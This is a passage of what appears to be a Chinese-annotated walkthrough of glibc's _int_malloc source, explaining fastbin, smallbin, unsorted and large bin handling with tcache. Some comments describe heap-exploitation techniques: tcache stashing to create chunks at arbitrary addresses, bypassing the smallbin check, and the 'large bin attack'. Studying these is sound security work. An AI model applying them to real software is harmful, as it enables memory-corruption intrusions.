class="hljs-type">long</span>) (nb) &lt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (get_max_fast ()))<br>    &#123;<br>      idx = fastbin_index (nb);<br>      mfastbinptr *fb = &amp;fastbin (av, idx);<br>      mchunkptr pp;<br>      victim = *fb;<br>      <span class="hljs-keyword">if</span> (victim != <span class="hljs-literal">NULL</span>)<br>&#123;<br>  <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)<br>    *fb = victim-&gt;fd;<br>  <span class="hljs-keyword">else</span><br>    REMOVE_FB (fb, pp, victim);<br>      <span class="hljs-comment">/* 因为在符合用户申请的chunk大小的fast bin中，存在空闲chunk，</span><br><span class="hljs-comment">          所以直接将bin中第一个chunk返回给用户 */</span><br><br>  <span class="hljs-keyword">if</span> (__glibc_likely (victim != <span class="hljs-literal">NULL</span>))<br>    &#123;<br>      <span class="hljs-type">size_t</span> victim_idx = fastbin_index (chunksize (victim));<br>      <span class="hljs-keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="hljs-number">0</span>))<br>malloc_printerr (<span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>);<br>          <span class="hljs-comment">/* 检测bin中的chunk是否被恶意修改过 */</span><br><br>      check_remalloced_chunk (av, victim, nb);<br>          <span class="hljs-comment">/* 对chunk进行全面的安全检测 */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE </span><br>      <span class="hljs-comment">/* 因为从fast bin中获取到的chunk大小与用户申请的chunk相同</span><br><span class="hljs-comment">          所以直接通过用户申请chunk大小，获取对应的tcache bin编号</span><br><span class="hljs-comment">          将当前fast bin中所有chunk放入tcache bin中，直到tcache bin被填满</span><br><span class="hljs-comment">          如果fast bin中还有chunk，就将其返回给用户 */</span><br><br>      <span class="hljs-comment">/*因为这个版本fast bin的检测较多，fast bin attack 不好利用，</span><br><span class="hljs-comment">         可以在fast bin的开头放一个正常的chunk，修改其fd为内存中任意地址，</span><br><span class="hljs-comment">          然后申请一个相应大小的chunk，使正常chunk与我们想要的地址都放入tcache bin中</span><br><span class="hljs-comment">          因为tcache bin的检测较少，只要允许申请足够数量的chunk，</span><br><span class="hljs-comment">          就可以在内存中任意位置创建一个chunk</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">         或者在tcache bin中只剩一个空位时，将fast bin中开头的正常的chunk放入tcache bin中</span><br><span class="hljs-comment">          这时因为tcache bin被填满了，这时就会在内存中任意地址创建一个chunk(需要程序使用calloc) */</span><br><br>      <span class="hljs-type">size_t</span> tc_idx = csize2tidx (nb);<br>      <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>&#123; <br>  mchunkptr tc_victim;<br>  <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count<br> &amp;&amp; (tc_victim = *fb) != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)<br>  <br>*fb = tc_victim-&gt;fd;<br>      <span class="hljs-keyword">else</span><br>&#123;<br>  REMOVE_FB (fb, pp, tc_victim);<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (tc_victim == <span class="hljs-literal">NULL</span>))<br>    <span class="hljs-keyword">break</span>;<br>&#125;<br>      tcache_put (tc_victim, tc_idx);<br>    &#125;<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>      alloc_perturb (p, bytes);<br>      <span class="hljs-keyword">return</span> p;<br>    &#125;<br>&#125;<br>    &#125;<br>  <span class="hljs-keyword">if</span> (in_smallbin_range (nb))<br>    &#123; <span class="hljs-comment">/* 当用户申请的chunk大小，符合small bin的范围 */</span><br><br>      idx = smallbin_index (nb);<br>      bin = bin_at (av, idx);<br>      <span class="hljs-keyword">if</span> ((victim = last (bin)) != bin)<br>        &#123; <span class="hljs-comment">/* 判断对应的small bin中是否存在chunk */</span><br>          bck = victim-&gt;bk;<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>    malloc_printerr (<span class="hljs-string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);<br>          <span class="hljs-comment">/* 检测双链表结构是否被破坏 */</span><br><br>          set_inuse_bit_at_offset (victim, nb);<br>          bin-&gt;bk = bck;<br>          bck-&gt;fd = bin;<br>          <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>    set_non_main_arena (victim);<br>          check_malloced_chunk (av, victim, nb);<br>          <span class="hljs-comment">/* 将chunk从small bin中取出 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>    <span class="hljs-comment">/* 当对应的tcache bin还没有填满，循环遍历small bin，</span><br><span class="hljs-comment">        直到tcache bin被填满，将剩余的第一个chunk返回给用户 */</span><br>    <br>    <span class="hljs-comment">/* 因为small bin中存在一个双链表检测，</span><br><span class="hljs-comment">         所以想要通过small bin在内存中某个位置创建chunk就比较困难</span><br><span class="hljs-comment">         不过可以通过tcache bin，与上面fast bin的思路相同*/</span><br><br>    <span class="hljs-comment">/* 因为这里仅对当前chunk进行链表检测，所以如果我们构造的地址在第三个或之后</span><br><span class="hljs-comment">      则可以绕过检测，直接在任意地址处放置chunk */</span><br><br>  <span class="hljs-type">size_t</span> tc_idx = csize2tidx (nb);<br>  <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>    &#123;<br>      mchunkptr tc_victim;<br>      <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count<br>     &amp;&amp; (tc_victim = last (bin)) != bin)<br>&#123;<br>  <span class="hljs-keyword">if</span> (tc_victim != <span class="hljs-number">0</span>)<br>    &#123;<br>      bck = tc_victim-&gt;bk;<br>      set_inuse_bit_at_offset (tc_victim, nb);<br>      <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>set_non_main_arena (tc_victim);<br>      bin-&gt;bk = bck;<br>      bck-&gt;fd = bin;<br>      tcache_put (tc_victim, tc_idx);<br>            &#125;<br>&#125;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>          <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>          alloc_perturb (p, bytes);<br>          <span class="hljs-keyword">return</span> p;<br>        &#125;<br>    &#125;<br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      idx = largebin_index (nb);<br>      <span class="hljs-comment">/* 获取用户申请的大小对应得到large bin编号 */</span><br>      <span class="hljs-keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))<br>        malloc_consolidate (av); <br>      <span class="hljs-comment">/* 合并fast bin中的chunk，并将合并后的chunk放入对应的small bin或large bin中 */</span><br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>  INTERNAL_SIZE_T tcache_nb = <span class="hljs-number">0</span>;<br>  <span class="hljs-type">size_t</span> tc_idx = csize2tidx (nb);<br>  <span class="hljs-comment">/* 当用户申请的大小对应的tcache bin中存在chunk</span><br><span class="hljs-comment">      则做好准备，在大循环中尝试从tcache bin中获取chunk */</span><br>  <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>    tcache_nb = nb;<br>  <span class="hljs-type">int</span> return_cached = <span class="hljs-number">0</span>;<br>  tcache_unsorted_count = <span class="hljs-number">0</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-keyword">for</span> (;; )<br>    &#123; <span class="hljs-comment">/* 进入大循环 */</span><br>      <span class="hljs-type">int</span> iters = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<br>        &#123; <span class="hljs-comment">/* 循环遍历unsorted bin中的chunk，将其中的chunk放入对应的bin中</span><br><span class="hljs-comment">              当符合用户申请的条件时，尝试分裂后返回给用户 */</span><br>          bck = victim-&gt;bk;<br>          size = chunksize (victim);<br>          mchunkptr next = chunk_at_offset (victim, size);<br>          <span class="hljs-keyword">if</span> (__glibc_unlikely (size &lt;= <span class="hljs-number">2</span> * SIZE_SZ)<br>              || __glibc_unlikely (size &gt; av-&gt;system_mem))<br>            malloc_printerr (<span class="hljs-string">&quot;malloc(): invalid size (unsorted)&quot;</span>);<br>          <span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; <span class="hljs-number">2</span> * SIZE_SZ)<br>              || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))<br>            malloc_printerr (<span class="hljs-string">&quot;malloc(): invalid next size (unsorted)&quot;</span>);<br>          <span class="hljs-keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))<br>            malloc_printerr (<span class="hljs-string">&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;</span>);<br>          <span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)<br>              || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))<br>            malloc_printerr (<span class="hljs-string">&quot;malloc(): unsorted double linked list corrupted&quot;</span>);<br>          <span class="hljs-keyword">if</span> (__glibc_unlikely (prev_inuse (next)))<br>            malloc_printerr (<span class="hljs-string">&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;</span>);<br>           <span class="hljs-comment">/* 进行安全检测</span><br><span class="hljs-comment">              1. 检测当前chunk大小是否合法</span><br><span class="hljs-comment">              2. 检测与当前chunk相邻的后一个chunk的大小是否合法</span><br><span class="hljs-comment">              3. 检测当前chunk的大小或相邻的后一个chunk的prev_size段是否被修改</span><br><span class="hljs-comment">              4. 检测双链表结构是否被破坏(防止unsorted bin的指针被修改)</span><br><span class="hljs-comment">              5. 检测相邻的后一个chunk的inuse位是否为0(如果为1则表示后面的chunk被修改了)</span><br><span class="hljs-comment">           */</span><br><br>          <span class="hljs-keyword">if</span> (in_smallbin_range (nb) &amp;&amp;<br>              bck == unsorted_chunks (av) &amp;&amp;<br>              victim == av-&gt;last_remainder &amp;&amp;<br>              (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br>            &#123; <span class="hljs-comment">/* </span><br><span class="hljs-comment">                 1. 用户申请的chunk大小符合small bin </span><br><span class="hljs-comment">                 2. unsorted bin中只有一个chunk时</span><br><span class="hljs-comment">                 3. 当前的chunk是由之前的chunk分裂后生成的</span><br><span class="hljs-comment">                 4. 当前的chunk分裂出用户申请的chunk后，还可以生成至少一个chunk</span><br><span class="hljs-comment">                 */</span><br>              remainder_size = size - nb;<br>              remainder = chunk_at_offset (victim, nb);<br>              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;<br>              av-&gt;last_remainder = remainder;<br>              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);<br>              <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>                &#123;<br>                  remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                  remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                  <span class="hljs-comment">/* 当分裂后剩余的chunk 符合large bin的范围时，</span><br><span class="hljs-comment">                      为将chunk放入large bin中做好准备 */</span><br>                &#125;<br>              set_head (victim, nb | PREV_INUSE |<br>                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>              set_head (remainder, remainder_size | PREV_INUSE);<br>              set_foot (remainder, remainder_size);<br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-comment">/* 设置分裂后剩余的chunk的头部，并对返回给用户的chunk进行安全检测与data初始化操作 */</span><br>              <span class="hljs-keyword">return</span> p;<br>            &#125;<br>          <span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>            malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);<br>            <span class="hljs-comment">/* 再次检测双链表完整性，防止unsorted bin中的chunk被修改 */</span><br>          unsorted_chunks (av)-&gt;bk = bck;<br>          bck-&gt;fd = unsorted_chunks (av); <br>            <span class="hljs-comment">/* 将当前chunk从unsorted bin中取出</span><br><span class="hljs-comment">                将其放入相应的bin中 */</span><br><br>          <span class="hljs-keyword">if</span> (size == nb)<br>            &#123; <span class="hljs-comment">/* 当chunk的大小符合用户申请的大小时，</span><br><span class="hljs-comment">                  如果对应的tcache bin中没有填满，则先将chunk放入tcache bin中</span><br><span class="hljs-comment">                  如果填满了，就设置好chunk的头部，将其返回给用户 */</span><br>              set_inuse_bit_at_offset (victim, size);<br>              <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>set_non_main_arena (victim);<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>      <span class="hljs-keyword">if</span> (tcache_nb<br>  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)<br>&#123;<br>  tcache_put (victim, tc_idx);<br>  return_cached = <span class="hljs-number">1</span>; <span class="hljs-comment">/* 设置状态变量，在遍历unsorted bin之后，从tcache bin中获取chunk</span><br><span class="hljs-comment">                              防止资源浪费 */</span><br>  <span class="hljs-keyword">continue</span>;<br>&#125;<br>      <span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>            &#125;<br>          <span class="hljs-keyword">if</span> (in_smallbin_range (size))<br>            &#123; <span class="hljs-comment">/* 当chunk符合small bin的范围时，准备好将其放入small bin </span><br><span class="hljs-comment">                  获取对应的small bin编号，并获取small bin中结尾的chunk，</span><br><span class="hljs-comment">                  用于将当前chunk添加进small bin */</span><br>              victim_index = smallbin_index (size);<br>              bck = bin_at (av, victim_index);<br>              fwd = bck-&gt;fd;<br>            &#125;<br>          <span class="hljs-keyword">else</span><br>            &#123;<br>              <span class="hljs-comment">/* 当chunk符合large bin的范围时，准备好将其放入large bin</span><br><span class="hljs-comment">                  获取对应的large bin编号，获取对应bin的最后一个chunk*/</span><br>              victim_index = largebin_index (size);<br>              bck = bin_at (av, victim_index);<br>              fwd = bck-&gt;fd;<br>              <span class="hljs-keyword">if</span> (fwd != bck)<br>                &#123; <span class="hljs-comment">/* 当bin中存在成员时 */</span><br>                  size |= PREV_INUSE;<br>                  assert (chunk_main_arena (bck-&gt;bk)); <br>                    <span class="hljs-comment">/* 当chunk不是通过主分配区分配则中断程序*/</span><br>                  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size)<br>      &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) chunksize_nomask (bck-&gt;bk))<br>                    &#123; <span class="hljs-comment">/* 因为bck-&gt;bk 指向的是第一个chunk，</span><br><span class="hljs-comment">                          在large bin中第一个chunk就是当前bin中最小的chunk</span><br><span class="hljs-comment">                          如果当前chunk的大小比当前bin中最小的chunk还小</span><br><span class="hljs-comment">                          就准备将当前chunk插入large bin的开头，</span><br><span class="hljs-comment">                          并将其加入size_bin中 */</span><br>                      fwd = bck;<br>                      bck = bck-&gt;bk;<br>                      victim-&gt;fd_nextsize = fwd-&gt;fd;<br>                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                  <span class="hljs-comment">/* 这里没有检测size_bin是否完整，</span><br><span class="hljs-comment">                      所以只要原先在large bin中存在一个较大chunk，</span><br><span class="hljs-comment">                      并且设置chunk中bk_nextsize字段为内存中的地址，</span><br><span class="hljs-comment">                      然后再从unsorted bin向large bin放入一个大小较小的chunk</span><br><span class="hljs-comment">                      就会向 原先指定的内存中的地址+0x20位置处 写入一个堆块地址 </span><br><span class="hljs-comment">                      这种利用方法叫做large bin attack*/</span><br><br>                    &#125;<br>                  <span class="hljs-keyword">else</span><br>                    &#123;<br>                      assert (chunk_main_arena (fwd));<br>                      <span class="hljs-comment">/* 限制chunk必须属于主分配区，这里是防止bin被修改 */</span> <br>                      <span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; chunksize_nomask (fwd))<br>                        &#123;<br>                          fwd = fwd-&gt;fd_nextsize;<br>  assert (chunk_main_arena (fwd));<br>                          <span class="hljs-comment">/* 利用size_bin获取large bin中第一个比当前chunk小的成员 </span><br><span class="hljs-comment">                            这样就可以找到一个 a&lt;= ?? &lt;b 的位置*/</span><br>                        &#125;<br>                      <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size<br>  == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) chunksize_nomask (fwd))  <br>        <span class="hljs-comment">/*如果当前chunk与找到的size_bin的第一个成员大小相同，</span><br><span class="hljs-comment">            则将当前chunk插入到找到的size_bin节点在large bin中的位置的前面*/</span><br><br>                        fwd = fwd-&gt;fd;<br>                      <span class="hljs-keyword">else</span><br>                        &#123;<br>                          <span class="hljs-comment">/* 这种情况就是 a&lt; ?? &lt; b</span><br><span class="hljs-comment">                            所以在 size_bin中创建一个节点，在找到的节点后面</span><br><span class="hljs-comment">                            并将当前chunk插入到找到的size_bin节点在large bin中位置的后面*/</span><br>                          victim-&gt;fd_nextsize = fwd;<br>                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                          <span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))<br>                            malloc_printerr (<span class="hljs-string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);<br>                            <span class="hljs-comment">/* 检测size_bin完整性 */</span><br>                          fwd-&gt;bk_nextsize = victim;<br>                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                        &#125;<br>                      bck = fwd-&gt;bk;<br>                      <span class="hljs-keyword">if</span> (bck-&gt;fd != fwd)<br>                        malloc_printerr (<span class="hljs-string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);<br>                    &#125;<br>                &#125;<br>              <span class="hljs-keyword">else</span><br>                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>                <span class="hljs-comment">/* 当bin中不存在成员时，直接设置好chunk所属的size_bin，</span><br><span class="hljs-comment">                  size_bin属于当前large bin，用来快速找到当前bin中下一个较大的chunk*/</span><br>            &#125;<br>          mark_bin (av, victim_index);<br>          victim-&gt;bk = bck;<br>          victim-&gt;fd = fwd;<br>          fwd-&gt;bk = victim;<br>          bck-&gt;fd = victim;<br>          <span class="hljs-comment">/* 这里是真正将chunk放入small bin或large bin */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>      ++tcache_unsorted_count;<br>      <span class="hljs-keyword">if</span> (return_cached<br>  &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="hljs-number">0</span><br>  &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)<br>&#123; <span class="hljs-comment">/* 如果在执行上面的代码时 将unsorted bin中的chunk放入了tcache bin</span><br><span class="hljs-comment">        且tcache 设置了遍历unsorted bin获取chunk的阈值</span><br><span class="hljs-comment">        遍历unsorted bin中的chunk数量已经超过阈值，</span><br><span class="hljs-comment">        则直接将刚刚放入tcache bin中的chunk返回给用户*/</span><br>  <span class="hljs-keyword">return</span> tcache_get (tc_idx);<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_ITERS       10000</span><br>          <span class="hljs-keyword">if</span> (++iters &gt;= MAX_ITERS)<br>            <span class="hljs-keyword">break</span>; <span class="hljs-comment">/* 限制循环次数 防止死循环*/</span><br>        &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>      <span class="hljs-keyword">if</span> (return_cached)<br>&#123; <span class="hljs-comment">/* 如果上面的代码 从unsorted bin中取出chunk，</span><br><span class="hljs-comment">        并将其放入tcache bin中，则从tcache bin中取出chunk并返回给用户*/</span><br>  <span class="hljs-keyword">return</span> tcache_get (tc_idx);<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      <span class="hljs-keyword">if</span> (!in_smallbin_range (nb))<br>        &#123; <span class="hljs-comment">/* 当用户申请的chunk大小符合large bin的范围时 */</span><br><br>          bin = bin_at (av, idx);<br>          <span class="hljs-keyword">if</span> ((victim = first (bin)) != bin<br>      &amp;&amp; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) chunksize_nomask (victim)<br>        &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb))<br>            &#123; <span class="hljs-comment">/* 在大循环执行获取的用户申请的chunk的大小对应的large bin的编号在这里用上了</span><br><span class="hljs-comment">                   在链表中 bin本身的fd指针指向的是bin中最后一个成员</span><br><span class="hljs-comment">                                    bk指针指向的是bin中第一个成员</span><br><span class="hljs-comment">                   所以这里是确认找到的bin中存在 符合用户申请的大小 的chunk</span><br><span class="hljs-comment">                  (因为large bins中每个bin都不是只能储存一种大小的chunk</span><br><span class="hljs-comment">                     所以在 符合条件的bin 中存在比 申请的大小大的chunk) */</span><br><br>              victim = victim-&gt;bk_nextsize; <br>              <br>              <span class="hljs-comment">/*从前面将unsorted bin中的chunk放入large bin的代码可以看出</span><br><span class="hljs-comment">                  large bin中最后一个节点 也是对应的 size_bin的最后一个节点 </span><br><span class="hljs-comment">                因为victim是最大的，所以victim-&gt;bk_nextsize就是size_bin中最小的chunk */</span><br>              <span class="hljs-keyword">while</span> (((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size = chunksize (victim)) &lt;<br>                      (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb)))<br>                victim = victim-&gt;bk_nextsize;<br>                <span class="hljs-comment">/* 搜索当前bin，找到第一个符合用户申请大小的chunk */</span><br><br>              <span class="hljs-keyword">if</span> (victim != last (bin)<br>  &amp;&amp; chunksize_nomask (victim)<br>    == chunksize_nomask (victim-&gt;fd))<br>                victim = victim-&gt;fd;<br>              <span class="hljs-comment">/* 当搜索到的size_bin的节点不是当前bin中第一个成员</span><br><span class="hljs-comment">                  且在当前bin中与找到的节点大小相同的chunk不止一个</span><br><span class="hljs-comment">                   将 其他的大小与找到的节点相同的chunk 返回给用户</span><br><span class="hljs-comment">                  为防止频繁改动size_bin，非必要情况下一般不使用size_bin的节点创建chunk*/</span><br><br>              remainder_size = size - nb;<br>              unlink_chunk (av, victim); <br>                <span class="hljs-comment">/* 执行unlink</span><br><span class="hljs-comment">                    先将要返回给用户的chunk从bin中分离出来 */</span><br>              <span class="hljs-keyword">if</span> (remainder_size &lt; MINSIZE)<br>                &#123; <span class="hljs-comment">/* 如果将找到的chunk分裂之后无法再生成一个chunk</span><br><span class="hljs-comment">                      则直接将找到的chunk返回给用户 */</span><br><br>                  set_inuse_bit_at_offset (victim, size);<br>                  <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>    set_non_main_arena (victim);<br>                &#125;<br>              <span class="hljs-keyword">else</span><br>                &#123;<br>                  <span class="hljs-comment">/* 将找到的chunk分裂，并将剩余空间设置为一个新的chunk放入unsorted bin中 */</span><br>                  remainder = chunk_at_offset (victim, nb);<br>                  bck = unsorted_chunks (av);<br>                  fwd = bck-&gt;fd;<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))<br>    malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted unsorted chunks&quot;</span>);<br>                  remainder-&gt;bk = bck;<br>                  remainder-&gt;fd = fwd;<br>                  bck-&gt;fd = remainder;<br>                  fwd-&gt;bk = remainder;<br>                  <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>                    &#123;<br>                      remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                      remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                    &#125;<br>                  set_head (victim, nb | PREV_INUSE |<br>                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>                  set_head (remainder, remainder_size | PREV_INUSE);<br>                  set_foot (remainder, remainder_size);<br>                &#125;<br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-comment">/* 对chunk进行检测，并进行初始化操作之后返回给用户 */</span><br>              <span class="hljs-keyword">return</span> p;<br>            &#125;<br>        &#125;<br>      ++idx;<br>      bin = bin_at (av, idx);<br>      block = idx2block (idx);<br>      <span class="hljs-built_in">map</span> = av-&gt;binmap[block];<br>      bit = idx2bit (idx);<br>      <span class="hljs-comment">/* 在上面的代码中搜索了所有刚好符合 用户申请大小条件的bin</span><br><span class="hljs-comment">          这里先获取 符合用户申请大小条件的 一组 bin 与 bin 在这一组中的索引</span><br><span class="hljs-comment">          在下面的代码会搜索所有bin，除非找不到符合条件chunk*/</span><br>      <span class="hljs-keyword">for</span> (;; )<br>        &#123;<br>          <span class="hljs-keyword">if</span> (bit &gt; <span class="hljs-built_in">map</span> || bit == <span class="hljs-number">0</span>)<br>            &#123;<br>              <span class="hljs-keyword">do</span><br>                &#123;<br>                  <span class="hljs-keyword">if</span> (++block &gt;= BINMAPSIZE)<br>                    <span class="hljs-keyword">goto</span> use_top;<br>                    <span class="hljs-comment">/* 先尝试搜索一组有成员的bin，如果找不到就使用top chunk分裂获取*/</span><br>                &#125;<br>              <span class="hljs-keyword">while</span> ((<span class="hljs-built_in">map</span> = av-&gt;binmap[block]) == <span class="hljs-number">0</span>);<br>              bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));<br>              bit = <span class="hljs-number">1</span>; <br>            &#125;<br>          <span class="hljs-keyword">while</span> ((bit &amp; <span class="hljs-built_in">map</span>) == <span class="hljs-number">0</span>)<br>            &#123;<br>              <span class="hljs-comment">/* 在上面的do...while循环中已经找到一组肯定存在成员的bin</span><br><span class="hljs-comment">                现在是要精确找到存在成员的bin </span><br><span class="hljs-comment">                 bit==0 就表示程序流被控制了*/</span><br>              bin = next_bin (bin);<br>              bit &lt;&lt;= <span class="hljs-number">1</span>;<br>              assert (bit != <span class="hljs-number">0</span>);<br>            &#125;<br>          victim = last (bin);<br>          <span class="hljs-keyword">if</span> (victim == bin)<br>            &#123; <span class="hljs-comment">/* 如果找到的bin中实际上没有chunk</span><br><span class="hljs-comment">                  则表示 在获取 binmap的值没有更新</span><br><span class="hljs-comment">                  这里更新一下map，并获取下一个bin，然后进行下一次循环 */</span><br>              av-&gt;binmap[block] = <span class="hljs-built_in">map</span> &amp;= ~bit;<br>              bin = next_bin (bin);<br>              bit &lt;&lt;= <span class="hljs-number">1</span>;<br>            &#125;<br>          <span class="hljs-keyword">else</span><br>            &#123;<br>              size = chunksize (victim);<br>              assert ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb));<br>              <span class="hljs-comment">/* 如果这里找到的chunk的大小小于用户申请的大小，则表示chunk被恶意修改了 */</span><br>              remainder_size = size - nb;<br>              unlink_chunk (av, victim);<br>               <span class="hljs-comment">/* 将找到的chunk从对应的bin中分离出来 */</span><br>              <span class="hljs-keyword">if</span> (remainder_size &lt; MINSIZE)<br>                &#123;<br>                  set_inuse_bit_at_offset (victim, size);<br>                  <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>    set_non_main_arena (victim);<br>                    <span class="hljs-comment">/* 如果分裂后剩余空间无法生成一个完整的chunk，</span><br><span class="hljs-comment">                        则直接将整个chunk返回给用户 */</span><br>                &#125;<br>              <span class="hljs-keyword">else</span><br>                &#123;<br>                  <span class="hljs-comment">/* 将chunk分裂，并将分裂后剩余空间设置为一个新的chunk放入unsorted bin中*/</span><br>                  remainder = chunk_at_offset (victim, nb);<br>                  bck = unsorted_chunks (av);<br>                  fwd = bck-&gt;fd;<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))<br>    malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>);<br>                    <span class="hljs-comment">/* 检测双链表完整性 */</span><br>                  remainder-&gt;bk = bck;<br>                  remainder-&gt;fd = fwd;<br>                  bck-&gt;fd = remainder;<br>                  fwd-&gt;bk = remainder;<br>                  <span class="hljs-keyword">if</span> (in_smallbin_range (nb))<br>                    av-&gt;last_remainder = remainder;<br>                  <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>                    &#123;<br>                      remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                      remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                      <span class="hljs-comment">/* 如果分裂后剩余空间符合large bin的条件，则初始化fd_nextsize,bk_nextsize */</span><br>                    &#125;<br>                  set_head (victim, nb | PREV_INUSE |<br>                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>                  set_head (remainder, remainder_size | PREV_INUSE);<br>                  set_foot 